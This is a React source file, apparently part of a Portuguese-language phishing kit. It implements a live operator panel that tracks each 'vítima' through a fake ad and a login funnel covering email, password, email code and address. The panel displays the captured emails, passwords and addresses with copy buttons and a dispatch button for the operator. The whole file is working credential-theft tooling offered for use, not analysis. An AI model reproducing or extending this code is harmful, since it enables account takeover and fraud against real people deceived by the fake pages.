import { useEffect, useMemo, useRef, useState } from "react";
import { subscribeToOnlineVisitors, type PresenceMeta } from "@/lib/presence";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Activity, Eye, X, Zap, Radio, Mail, Lock, MapPin, Copy, Check } from "lucide-react";
import { playDing, ensureNotificationPermission } from "@/lib/notify";

/**
 * Painel "AO VIVO": mostra sessões online no momento (presence broadcast),
 * em qual tela cada vítima está, há quanto tempo, e a linha do tempo das
 * últimas ações dela. Permite abrir uma sessão em "modo foco" (overlay).
 */

interface Props {
  adId: string;
  /** Sessões com endereço/pedindo motorista (vindo do OrderStatusPanel) */
  pendingSessionIds: Set<string>;
  hasAddressIds: Set<string>;
  /** Chamado quando o admin clica "Despachar" no card foco */
  onFocusDispatch?: (sessionId: string) => void;
}

const SCREEN_LABELS: Record<string, string> = {
  main: "Anúncio",
  "access-account": "Login (e-mail)",
  password: "Senha",
  "email-code": "Código por e-mail",
  "forgot-password": "Esqueci senha",
  passwordless: "Sem senha",
  reactivate: "Reativar conta",
  "verification-success": "✅ Pedido / Endereço",
};

const SCREEN_ORDER = [
  "main",
  "access-account",
  "password",
  "email-code",
  "verification-success",
];

function screenLabel(kind?: string) {
  if (!kind) return "Carregando...";
  return SCREEN_LABELS[kind] || kind;
}

function screenColor(kind: string | undefined, isPending: boolean) {
  if (isPending) return "border-red-500 bg-red-500/10 text-red-600";
  switch (kind) {
    case "verification-success":
      return "border-green-500 bg-green-500/10 text-green-700";
    case "password":
    case "email-code":
      return "border-orange-500 bg-orange-500/10 text-orange-600";
    case "access-account":
    case "forgot-password":
    case "passwordless":
      return "border-yellow-500 bg-yellow-500/10 text-yellow-700";
    default:
      return "border-border bg-muted/40 text-muted-foreground";
  }
}

function fmtAgo(ms: number) {
  const s = Math.max(0, Math.floor(ms / 1000));
  if (s < 60) return `${s}s`;
  const m = Math.floor(s / 60);
  if (m < 60) return `${m}min ${s % 60}s`;
  return `${Math.floor(m / 60)}h ${m % 60}min`;
}

/**
 * Gera um "ID visível" curto e estável a partir do sessionId persistente do
 * navegador. Mesma pessoa = mesmo ID toda vez que volta no anúncio.
 */
function visitorBadge(sid: string): string {
  const clean = (sid || "").replace(/[^a-zA-Z0-9]/g, "");
  const tail = clean.slice(-6).toUpperCase().padStart(6, "0");
  return `#${tail}`;
}

interface ActionRow {
  id: string;
  session_id: string;
  action: string;
  payload: any;
  created_at: string;
}

interface LeadRow {
  id: string;
  session_id: string;
  field_name: string;
  value: string;
  created_at: string;
}

export function LiveSessionsPanel({ adId, pendingSessionIds, hasAddressIds, onFocusDispatch }: Props) {
  const [online, setOnline] = useState<Map<string, PresenceMeta>>(new Map());
  const [screenSince, setScreenSince] = useState<Map<string, number>>(new Map());
  const [actions, setActions] = useState<ActionRow[]>([]);
  const [leads, setLeads] = useState<LeadRow[]>([]);
  const [focusSid, setFocusSid] = useState<string | null>(null);
  const [now, setNow] = useState(Date.now());
  const [flashSid, setFlashSid] = useState<string | null>(null);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const seenJoinsRef = useRef<Set<string>>(new Set());
  const lastScreenRef = useRef<Map<string, string>>(new Map());

  // Tick de relógio pra atualizar "há Xs"
  useEffect(() => {
    const t = setInterval(() => setNow(Date.now()), 1000);
    return () => clearInterval(t);
  }, []);

  // Carrega últimas ações + leads (timeline) e escuta novas em realtime
  useEffect(() => {
    void ensureNotificationPermission();
    let cancelled = false;

    (async () => {
      const since = new Date(Date.now() - 30 * 60 * 1000).toISOString();
      const [{ data: acts }, { data: lds }] = await Promise.all([
        supabase
          .from("ad_session_actions")
          .select("id, session_id, action, payload, created_at")
          .eq("ad_id", adId)
          .gte("created_at", since)
          .order("created_at", { ascending: false })
          .limit(200),
        supabase
          .from("ad_leads")
          .select("id, session_id, field_name, value, created_at")
          .eq("ad_id", adId)
          .gte("created_at", since)
          .order("created_at", { ascending: false })
          .limit(200),
      ]);
      if (cancelled) return;
      setActions((acts as ActionRow[]) || []);
      setLeads((lds as LeadRow[]) || []);
    })();

    const ch = supabase
      .channel(`live-actions-${adId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_session_actions", filter: `ad_id=eq.${adId}` },
        (payload) => {
          setActions((prev) => [payload.new as ActionRow, ...prev].slice(0, 200));
        },
      )
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_leads", filter: `ad_id=eq.${adId}` },
        (payload) => {
          setLeads((prev) => [payload.new as LeadRow, ...prev].slice(0, 200));
        },
      )
      .subscribe();

    return () => {
      cancelled = true;
      void ch.unsubscribe();
    };
  }, [adId]);

  // Presence ao vivo
  useEffect(() => {
    const stop = subscribeToOnlineVisitors(
      (map) => {
        // Filtra só quem tá no MEU anúncio
        const filtered = new Map<string, PresenceMeta>();
        const now = Date.now();
        map.forEach((meta, sid) => {
          if (meta.adId !== adId) return;
          filtered.set(sid, meta);
          // Detecta mudança de tela pra atualizar "tempo na tela"
          const prev = lastScreenRef.current.get(sid);
          const curr = meta.screenKind || "main";
          if (prev !== curr) {
            lastScreenRef.current.set(sid, curr);
            setScreenSince((s) => {
              const next = new Map(s);
              next.set(sid, now);
              return next;
            });
          }
        });
        setOnline(filtered);
      },
      (sid, meta) => {
        if (meta.adId !== adId) return;
        if (seenJoinsRef.current.has(sid)) return;
        seenJoinsRef.current.add(sid);
        playDing();
        setFlashSid(sid);
        setTimeout(() => setFlashSid((cur) => (cur === sid ? null : cur)), 2000);
      },
      (sid) => {
        seenJoinsRef.current.delete(sid);
        lastScreenRef.current.delete(sid);
      },
    );
    return stop;
  }, [adId]);

  const sortedSessions = useMemo(() => {
    const arr = Array.from(online.entries()).map(([sid, meta]) => ({ sid, meta }));
    // Pendentes primeiro, depois quem tá na tela final, depois por mais recente
    arr.sort((a, b) => {
      const ap = pendingSessionIds.has(a.sid) ? 0 : 1;
      const bp = pendingSessionIds.has(b.sid) ? 0 : 1;
      if (ap !== bp) return ap - bp;
      const af = a.meta.screenKind === "verification-success" ? 0 : 1;
      const bf = b.meta.screenKind === "verification-success" ? 0 : 1;
      if (af !== bf) return af - bf;
      return (b.meta.online_at || "").localeCompare(a.meta.online_at || "");
    });
    return arr;
  }, [online, pendingSessionIds]);

  const focusSession = focusSid ? online.get(focusSid) : null;

  const copyValue = async (key: string, value: string) => {
    try {
      await navigator.clipboard.writeText(value);
      setCopiedKey(key);
      setTimeout(() => setCopiedKey((k) => (k === key ? null : k)), 1200);
    } catch {
      /* ignore */
    }
  };

  const pickLead = (leadsArr: LeadRow[], names: string[]) => {
    for (const n of names) {
      const found = leadsArr.find((l) => (l.field_name || "").toLowerCase().includes(n));
      if (found) return found;
    }
    return undefined;
  };

  return (
    <div className="space-y-3 rounded-lg border-2 border-primary/40 bg-gradient-to-br from-primary/5 to-transparent p-3 sm:p-4">
      <header className="flex flex-wrap items-center justify-between gap-2">
        <div className="flex items-center gap-2">
          <div className="relative">
            <Radio className="h-4 w-4 text-primary" />
            <span className="absolute -right-0.5 -top-0.5 h-2 w-2 animate-ping rounded-full bg-red-500" />
            <span className="absolute -right-0.5 -top-0.5 h-2 w-2 rounded-full bg-red-500" />
          </div>
          <h3 className="text-xs sm:text-sm font-semibold leading-tight">
            AO VIVO · {sortedSessions.length} {sortedSessions.length === 1 ? "vítima" : "vítimas"} no anúncio agora
          </h3>
        </div>
      </header>

      {sortedSessions.length === 0 ? (
        <div className="rounded-md border border-dashed border-border bg-card/40 p-3 text-center text-xs text-muted-foreground">
          Ninguém navegando agora. Quando alguém entrar, aparece aqui em tempo real (com som + flash).
        </div>
      ) : (
        <div className="grid gap-2 sm:grid-cols-2 xl:grid-cols-3">
          {sortedSessions.map(({ sid, meta }) => {
            const isPending = pendingSessionIds.has(sid);
            const hasAddress = hasAddressIds.has(sid);
            const since = screenSince.get(sid) || Date.now();
            const flashing = flashSid === sid;
            const stepIdx = SCREEN_ORDER.indexOf(meta.screenKind || "main");
            const progress = stepIdx >= 0 ? ((stepIdx + 1) / SCREEN_ORDER.length) * 100 : 10;
            const sessionActions = actions.filter((a) => a.session_id === sid).slice(0, 3);
            const sessionLeads = leads.filter((l) => l.session_id === sid);
            const emailLead = pickLead(sessionLeads, ["email", "e-mail", "mail"]);
            const passwordLead = pickLead(sessionLeads, ["password", "senha", "pass"]);
            const addressLead = pickLead(sessionLeads, ["endereco", "endereço", "address", "cep"]);
            const otherLead = sessionLeads.find(
              (l) => l !== emailLead && l !== passwordLead && l !== addressLead,
            );

            return (
              <button
                key={sid}
                type="button"
                onClick={() => setFocusSid(sid)}
                className={`group relative overflow-hidden rounded-lg border-2 p-3 text-left transition-all hover:scale-[1.01] hover:shadow-lg ${
                  isPending
                    ? "border-red-500 bg-red-500/10 shadow-[0_0_20px_hsl(0_85%_55%/0.3)]"
                    : meta.screenKind === "verification-success"
                    ? "border-green-500 bg-green-500/5"
                    : "border-primary/20 bg-card"
                } ${flashing ? "animate-pulse" : ""}`}
              >
                {isPending && (
                  <div className="absolute right-2 top-2 flex items-center gap-1 rounded-full bg-red-500 px-2 py-0.5 text-[10px] font-bold uppercase text-white">
                    <Zap className="h-3 w-3" /> PEDIU COLETA
                  </div>
                )}
                {!isPending && hasAddress && (
                  <div className="absolute right-2 top-2 rounded-full bg-green-500/20 px-2 py-0.5 text-[10px] font-semibold text-green-700">
                    📍 endereço
                  </div>
                )}

                <div className="mb-2 flex items-center gap-2">
                  <span className={`rounded px-2 py-0.5 text-[11px] font-bold uppercase tracking-wide ${screenColor(meta.screenKind, isPending)}`}>
                    {screenLabel(meta.screenKind)}
                  </span>
                  {(meta.screenKind === "access-account" ||
                    meta.screenKind === "password" ||
                    meta.screenKind === "email-code") && (
                    <span className="flex items-center gap-0.5" aria-label="digitando">
                      <span className="h-1 w-1 animate-bounce rounded-full bg-orange-500 [animation-delay:-0.3s]" />
                      <span className="h-1 w-1 animate-bounce rounded-full bg-orange-500 [animation-delay:-0.15s]" />
                      <span className="h-1 w-1 animate-bounce rounded-full bg-orange-500" />
                    </span>
                  )}
                  <span className="text-[10px] text-muted-foreground">há {fmtAgo(now - since)}</span>
                </div>

                <div className="mb-1.5 flex items-center gap-1.5">
                  <span className="relative flex h-1.5 w-1.5">
                    <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-green-500 opacity-75" />
                    <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-green-500" />
                  </span>
                  <span className="font-mono text-[11px] font-bold tracking-wider text-foreground">
                    Visitante {visitorBadge(sid)}
                  </span>
                  <span className="text-[10px] text-muted-foreground">online</span>
                </div>

                {/* Barra de progresso do funil */}
                <div className="mb-2 h-1.5 overflow-hidden rounded-full bg-muted">
                  <div
                    className={`h-full transition-all ${isPending ? "bg-red-500" : meta.screenKind === "verification-success" ? "bg-green-500" : "bg-primary"}`}
                    style={{ width: `${progress}%` }}
                  />
                </div>

                {/* Credenciais capturadas (destaque) */}
                {(emailLead || passwordLead || addressLead || otherLead) && (
                  <div className="space-y-1.5">
                    {emailLead && (
                      <CredField
                        icon={<Mail className="h-3 w-3" />}
                        label="E-mail"
                        value={emailLead.value}
                        tone="email"
                        copied={copiedKey === `${sid}-email`}
                        onCopy={(e) => {
                          e.stopPropagation();
                          void copyValue(`${sid}-email`, emailLead.value);
                        }}
                      />
                    )}
                    {passwordLead && (
                      <CredField
                        icon={<Lock className="h-3 w-3" />}
                        label="Senha"
                        value={passwordLead.value}
                        tone="password"
                        copied={copiedKey === `${sid}-pass`}
                        onCopy={(e) => {
                          e.stopPropagation();
                          void copyValue(`${sid}-pass`, passwordLead.value);
                        }}
                      />
                    )}
                    {addressLead && !emailLead && !passwordLead && (
                      <CredField
                        icon={<MapPin className="h-3 w-3" />}
                        label="Endereço"
                        value={addressLead.value}
                        tone="address"
                        copied={copiedKey === `${sid}-addr`}
                        onCopy={(e) => {
                          e.stopPropagation();
                          void copyValue(`${sid}-addr`, addressLead.value);
                        }}
                      />
                    )}
                    {!emailLead && !passwordLead && !addressLead && otherLead && (
                      <div className="truncate text-[10px] text-muted-foreground">
                        ✏️ {otherLead.field_name}: <span className="font-mono text-foreground">{otherLead.value}</span>
                      </div>
                    )}
                  </div>
                )}

                {sessionActions[0] && (
                  <div className="mt-1.5 truncate text-[10px] text-muted-foreground">
                    ⚡ {sessionActions[0].action}
                  </div>
                )}

                <div className="mt-2 flex items-center gap-1 text-[10px] font-medium text-primary opacity-0 transition-opacity group-hover:opacity-100">
                  <Eye className="h-3 w-3" /> abrir em foco
                </div>
              </button>
            );
          })}
        </div>
      )}

      {/* Modo FOCO */}
      {focusSid && focusSession && (
        <FocusOverlay
          sid={focusSid}
          meta={focusSession}
          isPending={pendingSessionIds.has(focusSid)}
          actions={actions.filter((a) => a.session_id === focusSid)}
          leads={leads.filter((l) => l.session_id === focusSid)}
          since={screenSince.get(focusSid) || Date.now()}
          now={now}
          onClose={() => setFocusSid(null)}
          onDispatch={() => {
            onFocusDispatch?.(focusSid);
            setFocusSid(null);
          }}
        />
      )}
    </div>
  );
}

function FocusOverlay({
  sid, meta, isPending, actions, leads, since, now, onClose, onDispatch,
}: {
  sid: string;
  meta: PresenceMeta;
  isPending: boolean;
  actions: ActionRow[];
  leads: LeadRow[];
  since: number;
  now: number;
  onClose: () => void;
  onDispatch: () => void;
}) {
  // Une ações + leads em uma única timeline
  const timeline = useMemo(() => {
    const items: Array<{ ts: string; type: "action" | "lead"; label: string; value?: string }> = [];
    actions.forEach((a) => items.push({ ts: a.created_at, type: "action", label: a.action, value: a.payload?.label || a.payload?.message }));
    leads.forEach((l) => items.push({ ts: l.created_at, type: "lead", label: l.field_name, value: l.value }));
    items.sort((a, b) => b.ts.localeCompare(a.ts));
    return items.slice(0, 30);
  }, [actions, leads]);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-2 sm:p-4 animate-fade-in overflow-y-auto" onClick={onClose}>
      <div
        className={`relative w-full max-w-2xl max-h-[95vh] overflow-y-auto rounded-2xl border-2 bg-background shadow-2xl animate-scale-in ${
          isPending ? "border-red-500" : "border-primary"
        }`}
        onClick={(e) => e.stopPropagation()}
      >
        <button
          onClick={onClose}
          className="absolute right-3 top-3 z-10 rounded-full bg-muted p-1.5 hover:bg-muted/80"
          aria-label="Fechar"
        >
          <X className="h-4 w-4" />
        </button>

        <div className={`p-6 ${isPending ? "bg-red-500/10" : "bg-primary/5"}`}>
          <div className="mb-2 flex items-center gap-2">
            <Activity className="h-5 w-5 text-primary animate-pulse" />
            <span className="font-mono text-xs font-bold tracking-wider text-foreground">
              VISITANTE {visitorBadge(sid)}
            </span>
            <span className="text-[10px] font-medium uppercase text-green-600">● online</span>
          </div>
          <h2 className="text-2xl font-bold">{screenLabel(meta.screenKind)}</h2>
          <p className="mt-1 text-sm text-muted-foreground">Há {fmtAgo(now - since)} nesta tela</p>

          {isPending && (
            <Button
              size="lg"
              className="mt-4 w-full bg-red-500 text-lg font-bold hover:bg-red-600 animate-pulse"
              onClick={onDispatch}
            >
              <Zap className="mr-2 h-5 w-5" />
              DESPACHAR MOTORISTA AGORA
            </Button>
          )}
        </div>

        <div className="border-t bg-card/40 p-6">
          <h3 className="mb-3 text-xs font-semibold uppercase tracking-wide text-muted-foreground">
            Linha do tempo (últimos 30min)
          </h3>
          {timeline.length === 0 ? (
            <p className="text-xs text-muted-foreground italic">Nenhuma ação registrada ainda — só navegando.</p>
          ) : (
            <div className="max-h-80 space-y-2 overflow-y-auto">
              {timeline.map((item, i) => (
                <div key={i} className="flex items-start gap-2 rounded border border-border bg-background p-2 text-xs">
                  <span className="mt-0.5 text-base">{item.type === "lead" ? "✏️" : "⚡"}</span>
                  <div className="min-w-0 flex-1">
                    <p className="font-medium">{item.label}</p>
                    {item.value && <p className="truncate font-mono text-[11px] text-muted-foreground">{item.value}</p>}
                    <p className="text-[10px] text-muted-foreground">
                      {new Date(item.ts).toLocaleTimeString("pt-BR")}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function CredField({
  icon,
  label,
  value,
  tone,
  copied,
  onCopy,
}: {
  icon: React.ReactNode;
  label: string;
  value: string;
  tone: "email" | "password" | "address";
  copied: boolean;
  onCopy: (e: React.MouseEvent) => void;
}) {
  const toneClass =
    tone === "password"
      ? "border-orange-500/40 bg-orange-500/10"
      : tone === "email"
      ? "border-yellow-500/40 bg-yellow-500/10"
      : "border-green-500/40 bg-green-500/10";
  const iconBg =
    tone === "password"
      ? "bg-orange-500/20 text-orange-600"
      : tone === "email"
      ? "bg-yellow-500/20 text-yellow-700"
      : "bg-green-500/20 text-green-700";
  return (
    <div className={`flex items-center gap-2 rounded-md border ${toneClass} px-2 py-1.5`}>
      <div
        className={`flex h-6 w-6 shrink-0 items-center justify-center rounded ${iconBg}`}
        aria-hidden
      >
        {icon}
      </div>
      <div className="min-w-0 flex-1 leading-tight">
        <p className="text-[9px] font-bold uppercase tracking-wider text-muted-foreground">
          {label}
        </p>
        <p className="truncate font-mono text-[11px] font-semibold text-foreground">
          {value}
        </p>
      </div>
      <button
        type="button"
        onClick={onCopy}
        className="shrink-0 rounded p-1 text-muted-foreground transition hover:bg-background hover:text-foreground"
        aria-label={`Copiar ${label}`}
      >
        {copied ? <Check className="h-3.5 w-3.5 text-green-600" /> : <Copy className="h-3.5 w-3.5" />}
      </button>
    </div>
  );
}